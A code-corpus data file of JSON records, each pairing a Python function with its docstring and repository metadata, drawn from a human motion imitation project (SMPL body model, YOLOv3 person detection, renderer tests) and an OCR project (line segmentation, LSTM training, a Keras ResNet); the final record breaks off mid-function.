{"docstring": "\"\"\"Whether a silhouette by neural renderer matches that by Blender.\"\"\"\n\n# load teapot\n", "func_signal": "def test_forward_case1(self):\n", "code": "vertices, faces, _ = utils.load_teapot_batch()\n\n# create renderer\nrenderer = nr.Renderer(camera_mode='look_at')\nrenderer.image_size = 256\nrenderer.anti_aliasing = False\n\nimages = renderer(vertices, faces, mode='depth')\nimages = images.detach().cpu().numpy()\nimage = images[2]\nimage = image != image.max()\n\n# load reference image by blender\nref = imread(os.path.join(data_dir, 'teapot_blender.png'))\nref = (ref.min(axis=-1) != 255).astype(np.float32)\n\nassert(np.allclose(ref, image))", "path": "impersonator/thirdparty/neural_renderer/tests/test_rasterize_depth.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "# load teapot\n", "func_signal": "def test_forward_case2(self):\n", "code": "vertices, faces, _ = utils.load_teapot_batch()\n\n# create renderer\nrenderer = nr.Renderer(camera_mode='look_at')\nrenderer.image_size = 256\nrenderer.anti_aliasing = False\n\nimages = renderer(vertices, faces, mode='depth')\nimages = images.detach().cpu().numpy()\nimage = images[2]\nimage[image == image.max()] = image.min()\nimage = (image - image.min()) / (image.max() - image.min())\n\nref = imread(os.path.join(data_dir, 'test_depth.png')).astype(np.float32) / 255.\n\nassert(np.allclose(image, ref, atol=1e-2))", "path": "impersonator/thirdparty/neural_renderer/tests/test_rasterize_depth.py", "commit_date": "2019-07-12 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\nRun YOLOv3 on input_imgs and return the largest bounding boxes of the person in input_imgs.\n\nArgs:\n    input_imgs (torch.tensor): (bs, 3, height, width) is in the range of [0, 1],\n    input_shapes (list[tuple]): [(height, width), (height, width), ...],\n    factor (float): the factor to enlarge the original boxes, e.g [x0, y0, x1, y1] -> [xx0, yy0, xx1, yy1],\n            here (xx1 - xx0) / (x1 - x0) = factor and (yy1 - yy0) / (y1 - y0) = factor.\n\nReturns:\n    boxes_list (list[tuple or None]): (x1, y1, x2, y2) or None\n\"\"\"\n\n# Get detections\n", "func_signal": "def forward(self, input_imgs, input_shapes, factor=1.05):\n", "code": "with torch.no_grad():\n    # img, _ = pad_to_square(input_imgs, 0)\n    # Resize\n    img_detections = self.model(input_imgs)\n    img_detections = non_max_suppression(img_detections, self.conf_thres, self.nms_thres)\n\nbs = len(img_detections)\n\nboxes_list = [None for _ in range(bs)]\n# Draw bounding boxes and labels of detections\n\nfor i, (detections, img_shape) in enumerate(zip(img_detections, input_shapes)):\n    if detections is not None:\n        # Rescale boxes to original image\n        detections = rescale_boxes(detections, self.img_size, img_shape)\n\n        max_area = 0\n        boxes = None\n        for x1, y1, x2, y2, conf, cls_conf, cls_pred in detections:\n            # if is `person`\n            if int(cls_pred) != 0:\n                continue\n\n            box_w = x2 - x1\n            box_h = y2 - y1\n            area = box_h * box_w\n\n            if area > max_area:\n                max_area = area\n                boxes = (x1, y1, x2, y2)\n\n        if boxes is not None:\n            boxes_list[i] = self.enlarge_boxes(boxes, img_shape, factor=factor)\n\nreturn boxes_list", "path": "impersonator/thirdparty/his_evaluators/his_evaluators/metrics/yolov3/human_detector.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\n:type preds:  torch.tensor, (self.time_step, num_points, 2)\n:param preds: the time series of predicted keypoints.\n\n:type gts:  torch.tensor, (self.time_step, num_points, 2)\n:param gts: the time series of ground truth keypoints.\n\"\"\"\n\n", "func_signal": "def vis_keypoints(self, preds, gts):\n", "code": "lsp_key_points_name = ['Right ankle', 'Right knee', 'Right hip', 'Left hip', 'Left knee', 'Left ankle', 'Right wrist', 'Right elbow', 'Right shoulder',\n                       'Left shoulder', 'Left elbow', 'Left wrist', 'Neck', 'Head top']\nlsp_plus_key_points_name = lsp_key_points_name + ['Left ear', 'Left eye', 'Nose', 'Right ear', 'Right eye']\n\npreds = preds.clone()\npreds[:, :, 1] = - preds[:, :, 1]\ngts = gts.clone()\ngts[:, :, 1] = - gts[:, :, 1]\n\nfor i in range(self.time_step):\n    win = 'pred_keypoints_' + str(i)\n    self.draw_skeleton(preds[i], win, plus=True)\n\nfor i in range(self.time_step):\n    win = 'gt_keypoints_' + str(i)\n    self.draw_skeleton(gts[i], win, plus=False)", "path": "impersonator/utils/visdom_visualizer.py", "commit_date": "2019-09-20 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\nTheta is N x 3\n\nrodrigues (from cv2.rodrigues):\nsource: https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html\ninput: r (3 x 1)\noutput: R (3 x 3)\n\n    angle = norm(r)\n    r = r / angle\n\n    skew(r) = [[ 0,    -rz,      ry],\n               [ rz,     0,     -rx],\n               [-ry,    rx,       0]]\n\n    R = cos(theta * eye(3) + (1 - cos(theta)) * r * r.T + sin(theta) *  skew(r)\n\"\"\"\n", "func_signal": "def batch_rodrigues(theta, device=\"cpu\"):\n", "code": "batch_size = theta.shape[0]\n\n# angle (batch_size, 1), r (batch_size, 3)\nangle = torch.norm(theta + 1e-8, p=2, dim=1, keepdim=True)\nr = torch.div(theta, angle)\n\n# angle (batch_size, 1, 1), r (batch_size, 3, 1)\nangle = angle.unsqueeze(-1)\nr = r.unsqueeze(-1)\n\ncos = torch.cos(angle)\nsin = torch.sin(angle)\n\n# outer (batch_size, 3, 3)\nouter = torch.matmul(r, r.permute(0, 2, 1))\neyes = torch.eye(3, dtype=torch.float32).unsqueeze(0).repeat(batch_size, 1, 1).to(device)\n\nR = cos * eyes + (1 - cos) * outer + sin * batch_skew(r, batch_size=batch_size, device=device)\n\nreturn R", "path": "impersonator/networks/batch_smpl.py", "commit_date": "2019-10-01 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\nX is N x num_points x 3\ncamera is N x 3\nsame as applying orth_proj_idrot to each N\n\"\"\"\n\n# TODO check X dim size.\n\n# X_trans is (N, num_points, 2)\n", "func_signal": "def batch_orth_proj_idrot(X, camera, device=\"cpu\"):\n", "code": "X_trans = X[:, :, :2] + camera[:, None, 1:]\nreturn camera[:, None, 0:1] * X_trans", "path": "impersonator/networks/batch_smpl.py", "commit_date": "2019-10-01 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\n:param name: str, window name\n:param imgs: np.ndarray or torch.tensor, (self.time_step, 1, self.image_size, self.image_size)\n:param denormalize: True, [-1, 1] -> [0, 1]\n:param transpose: False\n:return:\n\"\"\"\n", "func_signal": "def vis_named_img(self, name, imgs, denormalize=True, transpose=False):\n", "code": "if isinstance(imgs, np.ndarray):\n    if imgs.ndim == 3:\n        imgs = imgs[:, np.newaxis, :, :]\n\n    if transpose:\n        imgs = np.transpose(imgs, (0, 3, 1, 2))\n\nelse:\n    if imgs.ndimension() == 3:\n        imgs = imgs[:, None, :, :]\n\n    if transpose:\n        imgs = imgs.permute(0, 3, 1, 2)\n\nif denormalize:\n    imgs = (imgs + 1) / 2.0\n\nself.vis.images(\n    tensor=imgs,\n    win=name,\n    opts={'title': name}\n)", "path": "impersonator/utils/visdom_visualizer.py", "commit_date": "2019-09-20 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\n\nArgs:\n    boxes (list or tuple): (x0, y0, x1, y1),\n    orig_shape (tuple or list): (height, width),\n    factor (float): the factor to enlarge the original boxes, e.g [x0, y0, x1, y1] -> [xx0, yy0, xx1, yy1],\n            here (xx1 - xx0) / (x1 - x0) = factor and (yy1 - yy0) / (y1 - y0) = factor.\n\nReturns:\n    new_boxes (list of tuple): (xx0, yy0, xx1, yy1),\n        here (xx1 - xx0) / (x1 - x0) = factor and (yy1 - yy0) / (y1 - y0) = factor.\n\"\"\"\n\n", "func_signal": "def enlarge_boxes(boxes, orig_shape, factor=1.0):\n", "code": "height, width = orig_shape\n\nx0, y0, x1, y1 = boxes\n\nw = x1 - x0\nh = y1 - y0\n\ncx = (x1 + x0) / 2\ncy = (y1 + y0) / 2\n\nhalf_new_w = w * factor / 2\nhalf_new_h = h * factor / 2\n\nxx0 = int(max(0, cx - half_new_w))\nyy0 = int(max(0, cy - half_new_h))\n\nxx1 = int(min(width, cx + half_new_w))\nyy1 = int(min(height, cy + half_new_h))\n\nnew_boxes = (xx0, yy0, xx1, yy1)\nreturn new_boxes", "path": "impersonator/thirdparty/his_evaluators/his_evaluators/metrics/yolov3/human_detector.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\nObtain SMPL with shape (beta) & pose (theta) inputs.\nTheta includes the global rotation.\nArgs:\n  beta: N x 10\n  theta: N x 72 (with 3-D axis-angle rep)\n  get_skin: boolean, return skin or not\n\nUpdates:\nself.J_transformed: N x 24 x 3 joint location after shaping\n         & posing with beta and theta\nReturns:\n  - joints: N x 19 or 14 x 3 joint locations depending on joint_type\nIf get_skin is True, also returns\n  - Verts: N x 6980 x 3\n\"\"\"\n", "func_signal": "def forward(self, beta, theta, get_skin=False):\n", "code": "device = beta.device\n\nnum_batch = beta.shape[0]\n\n# 1. Add shape blend shapes\n#       matmul  : (N, 10) x (10, 6890*3) = (N, 6890*3)\n#       reshape : (N, 6890*3) -> (N, 6890, 3)\n#       v_shaped: (N, 6890, 3)\nv_shaped = torch.matmul(beta, self.shapedirs).view(-1, self.size[0], self.size[1]) + self.v_template\n\n# 2. Infer shape-dependent joint locations.\n# ----- J_regressor: (6890, 24)\n# ----- Jx (Jy, Jz): (N, 6890) x (6890, 24) = (N, 24)\n# --------------- J: (N, 24, 3)\nJx = torch.matmul(v_shaped[:, :, 0], self.J_regressor)\nJy = torch.matmul(v_shaped[:, :, 1], self.J_regressor)\nJz = torch.matmul(v_shaped[:, :, 2], self.J_regressor)\nJ = torch.stack([Jx, Jy, Jz], dim=2)\n\n# 3. Add pose blend shapes\n# ------- theta    : (N, 72)\n# ------- reshape  : (N*24, 3)\n# ------- rodrigues: (N*24, 9)\n# -- Rs = reshape  : (N, 24, 3, 3)\nRs = batch_rodrigues(theta.view(-1, 3), device=device).view(-1, 24, 3, 3)\n# Ignore global rotation.\n#       Rs[:, 1:, :, :]: (N, 23, 3, 3)\n#           - np.eye(3): (N, 23, 3, 3)\n#          pose_feature: (N, 207)\npose_feature = (Rs[:, 1:, :, :] - torch.eye(3).to(device)).view(-1, 207)\n\n# (N, 207) x (207, 6890*3) -> (N, 6890, 3)\nv_posed = torch.matmul(pose_feature, self.posedirs).view(-1, self.size[0], self.size[1]) + v_shaped\n\n# 4. Get the global joint location\n# ------- Rs is (N, 24, 3, 3),         J is (N, 24, 3)\n# ------- J_transformed is (N, 24, 3), A is (N, 24, 4, 4)\nJ_transformed, A = batch_global_rigid_transformation(Rs, J, self.parents, device=device,\n                                                     rotate_base=self.rotate)\n\n# 5. Do skinning:\n# ------- weights is (6890, 24)\n# ---------- tile is (N*6890, 24)\n# --- W = reshape is (N, 6890, 24)\nW = self.weights.repeat(num_batch, 1).view(num_batch, -1, 24)\n\n# ------ reshape A is (N, 24, 16)\n# --------- matmul is (N, 6890, 24) x (N, 24, 16) -> (N, 6890, 16)\n# -------- reshape is (N, 6890, 4, 4)\nT = torch.matmul(W, A.view(num_batch, 24, 16)).view(num_batch, -1, 4, 4)\n\n# axis is 2, (N, 6890, 3) concatenate (N, 6890, 1) -> (N, 6890, 4)\nv_posed_homo = torch.cat(\n    [v_posed, torch.ones(num_batch, v_posed.shape[1], 1, dtype=torch.float32).to(device)], dim=2)\n\n# -unsqueeze_ is (N, 6890, 4, 1)\n# --------- T is (N, 6890, 4, 4)\n# ---- matmul is (N, 6890, 4, 4) x (N, 6890, 4, 1) -> (N, 6890, 4, 1)\nv_posed_homo = v_posed_homo.unsqueeze(-1)\nv_homo = torch.matmul(T, v_posed_homo)\n\n# (N, 6890, 3)\nverts = v_homo[:, :, :3, 0]\n\n# Get cocoplus or lsp joints: (N, 6890) x (6890, 19)\njoint_x = torch.matmul(verts[:, :, 0], self.joint_regressor)\njoint_y = torch.matmul(verts[:, :, 1], self.joint_regressor)\njoint_z = torch.matmul(verts[:, :, 2], self.joint_regressor)\njoints = torch.stack([joint_x, joint_y, joint_z], dim=2)\n\nif get_skin:\n    return verts, joints, Rs\nelse:\n    return joints", "path": "impersonator/networks/batch_smpl.py", "commit_date": "2019-10-01 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\nvec is N x 3, batch_size is int.\n\ne.g. r = [rx, ry, rz]\n    skew(r) = [[ 0,    -rz,      ry],\n               [ rz,     0,     -rx],\n               [-ry,    rx,       0]]\n\nreturns N x 3 x 3. Skew_sym version of each matrix.\n\"\"\"\n\n", "func_signal": "def batch_skew(vec, batch_size=None, device=\"cpu\"):\n", "code": "if batch_size is None:\n    batch_size = vec.shape[0]\n\ncol_inds = np.array([1, 2, 3, 5, 6, 7], dtype=np.int64)\n\n# indices = torch.from_numpy(np.reshape(\n#     np.reshape(np.arange(0, batch_size) * 9, [-1, 1]) + col_inds,\n#     newshape=(-1,))).to(device).long()\n\n# For better compatibility\uff0c since if indices is torch.tensor, it must be long dtype.\n# For fixed index, np.ndarray might be better.\nindices = np.reshape(np.reshape(\n    np.arange(0, batch_size) * 9, [-1, 1]) + col_inds, newshape=(-1, )).astype(np.int64)\n\nupdates = torch.stack(\n    [\n        -vec[:, 2], vec[:, 1], vec[:, 2],\n        -vec[:, 0], -vec[:, 1], vec[:, 0]\n    ],\n    dim=1\n).view(-1).to(device)\n\nres = torch.zeros(batch_size * 9, dtype=vec.dtype).to(device)\nres[indices] = updates\nres = res.view(batch_size, 3, 3)\n\nreturn res", "path": "impersonator/networks/batch_smpl.py", "commit_date": "2019-10-01 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\n    some task/method specific data pre-processing or others.\nArgs:\n    src_infos (dict): the source information contains:\n        --images (list of str): the list of full paths of source images (the length is 1)\n        --smpls (np.ndarray): (length of images, 85)\n        --kps (np.ndarray): (length of images, 19, 2)\n\nReturns:\n    processed_src_infos (dict): the source information contains:\n        --images (list of str): the list of full paths of source images (the length is 1)\n        --smpls (np.ndarray): (length of images, 85)\n        --kps (np.ndarray): (length of images, 19, 2)\n        ...\n\"\"\"\n\n", "func_signal": "def personalization(self, src_infos):\n", "code": "processed_src_infos = src_infos\nreturn processed_src_infos", "path": "impersonator/thirdparty/his_evaluators/his_evaluators/evaluators/motion_imitation.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"\nArgs:\n    model (MotionImitationModel): the model object, it must define and implements the function\n                    `imitate(src_infos, ref_infos, is_self_imitation) -> List[str]`\n    src_infos (dict): the source information contains:\n        --images (list of str): the list of full paths of source images (the length is 1)\n        --smpls (np.ndarray):\n        --kps (np.ndarray):\n    ref_infos (dict): the reference information contains:\n        --images (list of str):\n        --smpls (np.ndarray):\n        --kps (np.ndarray):\n        --self_imitation (bool):\n\nReturns:\n    file_paths (list of str): [pred_img_path_0, pred_img_path_1, ..., pred_img_path_i, ..., pred_img_path_n)]\n\n\"\"\"\n\n", "func_signal": "def run_inference(self, model, src_infos, ref_infos):\n", "code": "assert hasattr(model, \"imitate\"), '{} must implement imitate(src_infos, ref_infos) -> List[str]'\n\nfile_paths = model.imitate(src_infos, ref_infos)\n\nreturn file_paths", "path": "impersonator/thirdparty/his_evaluators/his_evaluators/evaluators/motion_imitation.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "svip-lab/impersonator", "stars": 1725, "license": "other", "language": "python", "size": 102098}
{"docstring": "\"\"\"Given a line segmentation map, computes a list\nof tuples consisting of 2D slices and masked images.\"\"\"\n", "func_signal": "def compute_lines(segmentation,scale):\n", "code": "lobjects = morph.find_objects(segmentation)\nlines = []\nfor i,o in enumerate(lobjects):\n    if o is None: continue\n    if sl.dim1(o)<2*scale or sl.dim0(o)<scale: continue\n    mask = (segmentation[o]==i+1)\n    if amax(mask)==0: continue\n    result = record()\n    result.label = i+1\n    result.bounds = o\n    result.mask = mask\n    lines.append(result)\nreturn lines", "path": "deep_ocr/deep_ocr/ocrolib/psegutils.py", "commit_date": "2017-10-06 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Set the learning rate and momentum for weight updates.\"\"\"\n", "func_signal": "def setLearningRate(self,r,momentum=0.9):\n", "code": "self.learning_rate = r\nself.momentum = momentum", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Adds a shortcut between input and residual block and merges them with \"sum\"\n\"\"\"\n# Expand channels of shortcut to match residual.\n# Stride appropriately to match residual (width, height)\n# Should be int if network architecture is correctly configured.\n", "func_signal": "def _shortcut(input, residual):\n", "code": "input_shape = K.int_shape(input)\nresidual_shape = K.int_shape(residual)\nstride_width = int(round(input_shape[ROW_AXIS] / residual_shape[ROW_AXIS]))\nstride_height = int(round(input_shape[COL_AXIS] / residual_shape[COL_AXIS]))\nequal_channels = input_shape[CHANNEL_AXIS] == residual_shape[CHANNEL_AXIS]\n\nshortcut = input\n# 1 X 1 conv if shape is different. Else identity.\nif stride_width > 1 or stride_height > 1 or not equal_channels:\n    shortcut = Conv2D(filters=residual_shape[CHANNEL_AXIS],\n                      kernel_size=(1, 1),\n                      strides=(stride_width, stride_height),\n                      padding=\"valid\",\n                      kernel_initializer=\"he_normal\",\n                      kernel_regularizer=l2(0.0001))(input)\n\nreturn add([shortcut, residual])", "path": "deep_ocr/scripts/training/keras_training.py", "commit_date": "2017-09-30 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Given a list of target classes `cs` and a total\nmaximum number of classes, compute an array that has\na `1` in each column and time step corresponding to the\ntarget class.\"\"\"\n", "func_signal": "def make_target(cs,nc):\n", "code": "result = zeros((2*len(cs)+1,nc))\nfor i,j in enumerate(cs):\n    result[2*i,0] = 1.0\n    result[2*i+1,j] = 1.0\nresult[-1,0] = 1.0\nreturn result", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Apply the forward algorithm to an array of log state\ncorrespondence probabilities.\"\"\"\n", "func_signal": "def forward_algorithm(match,skip=-5.0):\n", "code": "v = skip*arange(len(match[0]))\nresult = []\n# This is a fairly straightforward dynamic programming problem and\n# implemented in close analogy to the edit distance:\n# we either stay in the same state at no extra cost or make a diagonal\n# step (transition into new state) at no extra cost; the only costs come\n# from how well the symbols match the network output.\nfor i in range(0,len(match)):\n    w = roll(v,1).copy()\n    # extra cost for skipping initial symbols\n    w[0] = skip*i\n    # total cost is match cost of staying in same state\n    # plus match cost of making a transition into the next state\n    v = log_add(log_mul(v,match[i]),log_mul(w,match[i]))\n    result.append(v)\nreturn array(result,'f')", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Helper to build a BN -> relu -> conv block.\nThis is an improved scheme proposed in http://arxiv.org/pdf/1603.05027v2.pdf\n\"\"\"\n", "func_signal": "def _bn_relu_conv(**conv_params):\n", "code": "filters = conv_params[\"filters\"]\nkernel_size = conv_params[\"kernel_size\"]\nstrides = conv_params.setdefault(\"strides\", (1, 1))\nkernel_initializer = conv_params.setdefault(\"kernel_initializer\", \"he_normal\")\npadding = conv_params.setdefault(\"padding\", \"same\")\nkernel_regularizer = conv_params.setdefault(\"kernel_regularizer\", l2(1.e-4))\n\ndef f(input):\n    activation = _bn_relu(input)\n    return Conv2D(filters=filters, kernel_size=kernel_size,\n                  strides=strides, padding=padding,\n                  kernel_initializer=kernel_initializer,\n                  kernel_regularizer=kernel_regularizer)(activation)\n\nreturn f", "path": "deep_ocr/scripts/training/keras_training.py", "commit_date": "2017-09-30 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"An LSTM layer with a `Logreg` layer for the output.\"\"\"\n", "func_signal": "def LSTM1(Ni,Ns,No):\n", "code": "lstm = LSTM(Ni,Ns)\nif No==1:\n    logreg = Logreg(Ns,No)\nelse:\n    logreg = Softmax(Ns,No)\nstacked = Stacked([lstm,logreg])\nreturn stacked", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Given the list of lines (a list of 2D slices), computes\nthe partial reading order.  The output is a binary 2D array\nsuch that order[i,j] is true if line i comes before line j\nin reading order.\"\"\"\n", "func_signal": "def reading_order(lines,highlight=None,debug=0):\n", "code": "order = zeros((len(lines),len(lines)),'B')\ndef x_overlaps(u,v):\n    return u[1].start<v[1].stop and u[1].stop>v[1].start\ndef above(u,v):\n    return u[0].start<v[0].start\ndef left_of(u,v):\n    return u[1].stop<v[1].start\ndef separates(w,u,v):\n    if w[0].stop<min(u[0].start,v[0].start): return 0\n    if w[0].start>max(u[0].stop,v[0].stop): return 0\n    if w[1].start<u[1].stop and w[1].stop>v[1].start: return 1\nif highlight is not None:\n    clf(); title(\"highlight\"); imshow(binary); ginput(1,debug)\nfor i,u in enumerate(lines):\n    for j,v in enumerate(lines):\n        if x_overlaps(u,v):\n            if above(u,v):\n                order[i,j] = 1\n        else:\n            if [w for w in lines if separates(w,u,v)]==[]:\n                if left_of(u,v): order[i,j] = 1\n        if j==highlight and order[i,j]:\n            print((i, j), end=' ')\n            y0,x0 = sl.center(lines[i])\n            y1,x1 = sl.center(lines[j])\n            plot([x0,x1+200],[y0,y1])\nif highlight is not None:\n    print()\n    ginput(1,debug)\nreturn order", "path": "deep_ocr/deep_ocr/ocrolib/psegutils.py", "commit_date": "2017-10-06 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Extract a subimage from the image using the line descriptor.\nA line descriptor consists of bounds and a mask.\"\"\"\n", "func_signal": "def extract_masked(image,linedesc,pad=5,expand=0):\n", "code": "y0,x0,y1,x1 = [int(x) for x in [linedesc.bounds[0].start,linedesc.bounds[1].start, \\\n              linedesc.bounds[0].stop,linedesc.bounds[1].stop]]\nif pad>0:\n    mask = pad_image(linedesc.mask,pad,cval=0)\nelse:\n    mask = linedesc.mask\nline = extract(image,y0-pad,x0-pad,y1+pad,x1+pad)\nif expand>0:\n    mask = filters.maximum_filter(mask,(expand,expand))\nline = where(mask,line,amax(line))\nreturn line", "path": "deep_ocr/deep_ocr/ocrolib/psegutils.py", "commit_date": "2017-10-06 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Sum the element-wise products of the `us` and `vs`.\nValues are clipped into the range `[lo,hi]`.\nThis is mainly used for computing weight updates\nin logistic regression layers.\"\"\"\n", "func_signal": "def sumprod(us,vs,lo=-1.0,hi=1.0,out=None):\n", "code": "assert len(us[0])==len(vs[0])\nresult = out or zeros(len(us[0]))\nfor u,v in zip(us,vs):\n    result += clip(u,lo,hi)*v\nreturn result", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Builds a custom ResNet like architecture.\nArgs:\n    input_shape: The input shape in the form (nb_channels, nb_rows, nb_cols)\n    num_outputs: The number of outputs at final softmax layer\n    block_fn: The block function to use. This is either `basic_block` or `bottleneck`.\n        The original paper used basic_block for layers < 50\n    repetitions: Number of repetitions of various block units.\n        At each block unit, the number of filters are doubled and the input size is halved\nReturns:\n    The keras `Model`.\n\"\"\"\n", "func_signal": "def build(input_shape, num_outputs, block_fn, repetitions):\n", "code": "_handle_dim_ordering()\nif len(input_shape) != 3:\n    raise Exception(\"Input shape should be a tuple (nb_channels, nb_rows, nb_cols)\")\n\n# Permute dimension order if necessary\nif K.image_dim_ordering() == 'tf':\n    input_shape = (input_shape[0], input_shape[1], input_shape[2])\n\n# Load function from str if needed.\nblock_fn = _get_block(block_fn)\n\ninput = Input(shape=input_shape)\nconv1 = _conv_bn_relu(filters=64, kernel_size=(7, 7), strides=(2, 2))(input)\npool1 = MaxPooling2D(pool_size=(3, 3), strides=(2, 2), padding=\"same\")(conv1)\n\nblock = pool1\nfilters = 64\nfor i, r in enumerate(repetitions):\n    block = _residual_block(block_fn, filters=filters, repetitions=r, is_first_layer=(i == 0))(block)\n    filters *= 2\n\n# Last activation\nblock = _bn_relu(block)\n\n# Classifier block\nblock_shape = K.int_shape(block)\npool2 = AveragePooling2D(pool_size=(block_shape[ROW_AXIS], block_shape[COL_AXIS]),\n                         strides=(1, 1))(block)\nflatten1 = Flatten()(pool2)\ndense = Dense(units=num_outputs, kernel_initializer=\"he_normal\",\n              activation=\"softmax\")(flatten1)\n\nmodel = Model(inputs=input, outputs=dense)\nreturn model", "path": "deep_ocr/scripts/training/keras_training.py", "commit_date": "2017-09-30 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Training performs forward propagation, computes the output deltas\nas the difference between the predicted and desired values,\nand then propagates those deltas backwards.\"\"\"\n", "func_signal": "def train(self,xs,ys,debug=0):\n", "code": "xs = array(xs)\nys = array(ys)\npred = array(self.forward(xs))\ndeltas = ys - pred\nself.backward(deltas)\nself.update()\nreturn pred", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Apply the forward-backward algorithm to an array of log state\ncorrespondence probabilities.\"\"\"\n", "func_signal": "def forwardbackward(lmatch):\n", "code": "lr = forward_algorithm(lmatch)\n# backward is just forward applied to the reversed sequence\nrl = forward_algorithm(lmatch[::-1,::-1])[::-1,::-1]\nboth = lr+rl\nreturn both", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Reset the contents of the internal state variables to `nan`\"\"\"\n", "func_signal": "def reset(self,n):\n", "code": "vars = \"cix ci gix gi gox go gfx gf\"\nvars += \" state output gierr gferr goerr cierr stateerr outerr\"\nvars += \" source sourceerr\"\nfor v in vars.split():\n    getattr(self,v)[:,:] = nan", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Forward propagate activations. This updates the internal\nstate for a subsequent call to `backward` and returns the output\nactivations.\"\"\"\n", "func_signal": "def forward(self,ys):\n", "code": "n = len(ys)\ninputs,zs = [None]*n,[None]*n\nfor i in range(n):\n    inputs[i] = concatenate([ones(1),ys[i]])\n    temp = dot(self.W2,inputs[i])\n    temp = exp(clip(temp,-100,100))\n    temp /= sum(temp)\n    zs[i] = temp\nself.state = (inputs,zs)\nreturn zs", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Training for classification.  This handles\nthe special case of just two classes. It also\ncan use regular least square error training or\naccelerated training using 1/pred as the error signal.\"\"\"\n", "func_signal": "def ctrain(self,xs,cs,debug=0,lo=1e-5,accelerated=1):\n", "code": "assert len(cs.shape)==1\nassert (cs==array(cs,'i')).all()\nxs = array(xs)\npred = array(self.forward(xs))\ndeltas = zeros(pred.shape)\nassert len(deltas)==len(cs)\n# NB: these deltas are such that they can be used\n# directly to update the gradient; some other libraries\n# use the negative value.\nif accelerated:\n    # ATTENTION: These deltas use an \"accelerated\" error signal.\n    if deltas.shape[1]==1:\n        # Binary class case uses just one output variable.\n        for i,c in enumerate(cs):\n            if c==0:\n                deltas[i,0] = -1.0/max(lo,1.0-pred[i,0])\n            else:\n                deltas[i,0] = 1.0/max(lo,pred[i,0])\n    else:\n        # For the multi-class case, we use all output variables.\n        deltas[:,:] = -pred[:,:]\n        for i,c in enumerate(cs):\n            deltas[i,c] = 1.0/max(lo,pred[i,c])\nelse:\n    # These are the deltas from least-square error\n    # updates. They are slower than `accelerated`,\n    # but may give more accurate probability estimates.\n    if deltas.shape[1]==1:\n        # Binary class case uses just one output variable.\n        for i,c in enumerate(cs):\n            if c==0:\n                deltas[i,0] = -pred[i,0]\n            else:\n                deltas[i,0] = 